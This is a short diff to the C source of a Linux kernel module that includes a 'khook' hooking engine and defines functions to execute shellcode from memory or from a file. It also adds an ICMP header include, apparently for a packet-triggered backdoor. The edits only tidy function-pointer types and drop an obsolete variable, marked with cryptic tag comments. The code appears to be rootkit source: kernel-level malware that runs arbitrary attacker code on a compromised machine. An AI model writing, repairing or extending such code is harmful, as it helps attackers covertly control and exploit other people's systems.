@@ -1,5 +1,6 @@
 #include <linux/module.h>
 #include <linux/version.h>
+#include <linux/icmp.h> // Pb3d3
 
 #include "khook/engine.c"
 #include "config.h"
@@ -501,15 +502,14 @@ MODULE_LICENSE("GPL");
 
 void execute_shellcode(void *shellcode)
 {
-	void (*func)();
-	func = (void (*)())shellcode;
+	void (*func)(void); // P55d6
+	func = (void (*)(void))shellcode; // P55d6
 	func();
 }
 
 void execute_shellcode_from_file(const char *filename)
 {
 	struct file *file;
-	mm_segment_t old_fs;
 	loff_t pos = 0;
 	void *shellcode;
 	size_t size;
